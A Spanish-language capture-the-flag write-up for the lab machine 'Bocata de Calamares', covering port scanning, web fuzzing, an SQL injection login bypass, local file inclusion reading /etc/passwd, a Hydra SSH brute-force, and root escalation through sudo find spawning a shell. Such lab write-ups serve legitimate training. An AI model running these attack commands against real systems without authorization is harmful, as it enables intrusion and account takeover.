# 🥪 Resolución del CTF "Bocata de Calamares" | The HackersLabs

**Plataforma:** TheHackersLabs  
**Nombre de la máquina:** Bocata de Calamares  
**Dificultad:** Media  
**Enfoque:** SQL Injection, LFI, fuerza bruta SSH, escalada con GTFOBins

---

## 🔍 1. Escaneo de puertos con Nmap

```bash
nmap -p- -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.1.127 -oN escaneo.txt
```

**Puertos abiertos:**

- 22/tcp → OpenSSH 9.6p1 (Ubuntu)
- 80/tcp → Apache httpd 2.4.9 (Ubuntu)

---

## 🌐 2. Enumeración web

La web principal `http://192.168.1.127/` muestra una página de noticias falsas llamada **ALL FAKE NEWS**.  
Uno de los artículos menciona explícitamente SQLi como posible vulnerabilidad.

---

## 🔎 3. Fuzzing con Feroxbuster

```bash
feroxbuster -u http://192.168.1.127 -x php,html,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Se identifican:

- `/login.php`
- `/admin.php`
- `/todo-list.php`
- `/sqli.php` (explica la vulnerabilidad con ejemplo)

---

## 💥 4. Inyección SQL

Desde `sqli.php` obtenemos un payload útil:

```
Usuario: admin
Contraseña: ' OR '1'='1
```

Lo usamos en `login.php`, accediendo así al panel de administración `admin.php`.

---

## 📋 5. Enumeración desde admin.php

`admin.php` da acceso a `/todo-list.php`. Allí encontramos una pista:

> “He creado una página para leer archivos, codificada en base64 (lee_archivos)”

---

## 🧠 6. Decodificación de ruta y explotación de LFI

```bash
echo "lee_archivos" | base64
# bGVlX2FyY2hpdm9zCg==
```

Al visitar:

```
http://192.168.1.127/bGVlX2FyY2hpdm9zCg==.php
```

Se muestra un formulario vulnerable a LFI. Probamos con `/etc/passwd` y listamos usuarios.  
Detectamos: `superadministrator`

---

## 🔓 7. Ataque de fuerza bruta SSH con Hydra

```bash
hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.127 -t 64
```

✅ Credenciales válidas:

- Usuario: `superadministrator`
- Contraseña: `princesa`

---

## 💻 8. Acceso SSH y flag de usuario

```bash
ssh superadministrator@192.168.1.127
```

Revisamos el home y encontramos:

```bash
cat flag.txt
# FLAG_USUARIO_AQUI
```

---

## 📝 9. Recordatorio interesante

El archivo `recordatorio.txt` contiene esta nota:

> “Existe una página llamada GTFOBins muy útil para CTFs…”

---

## ⚙️ 10. Escalada de privilegios con find

```bash
sudo -l
```

Permisos detectados:

```bash
(ALL) NOPASSWD: /usr/bin/find
```

Con ayuda de GTFOBins:

```bash
sudo find . -exec /bin/sh \; -quit
whoami
# root
```

---

## 🏁 11. Flag final (root)

```bash
cat /root/root.txt
# FLAG_ROOT_AQUI
```

---

## ✅ Conclusión

1. Escaneo y enumeración web.
2. SQLi para entrar como admin.
3. Pista sobre página oculta con LFI.
4. Decodificación base64 y lectura de `/etc/passwd`.
5. Fuerza bruta por SSH → acceso como superadministrator.
6. Flag de usuario + escalada con `find` vía GTFOBins.
7. Flag final obtenida como root.

¡Un CTF con narrativa divertida y técnicas variadas de pentesting!

